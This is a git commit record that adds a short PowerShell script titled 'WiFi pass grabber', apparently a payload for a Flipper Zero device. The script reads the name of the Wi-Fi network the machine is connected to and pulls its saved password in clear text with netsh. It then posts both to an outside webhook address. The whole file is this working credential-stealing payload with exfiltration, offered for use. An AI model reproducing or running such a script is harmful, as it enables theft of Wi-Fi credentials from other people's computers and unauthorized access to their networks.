1974492ccf657d5d77e6d45d77da553d81c3d860
will-c0de <40558280+will-c0de@users.noreply.github.com>
2023-01-28 20:05:44 +0000

    📜 Edited the WiFi pass grabber [v1.1]

---
+++ assets/WiFi-Pass/WiFi-Pass.ps1
@@ -0,0 +1,8 @@
+# Created by Will | @willsflipper
+
+$ssid = netsh wlan show interface | Select-String -Pattern ' SSID '
+$ssid = [string]$ssid
+$pos = $ssid.IndexOf(':')
+$ssid = $ssid.Substring($pos+2).Trim()
+$pass = (((netsh.exe wlan show profiles name="$ssid" key=clear | select-string -Pattern "Key Content") -split ":")[1]).Trim()
+Invoke-RestMethod -Method Post -Uri "$wh" -Body "$ssid : $pass"
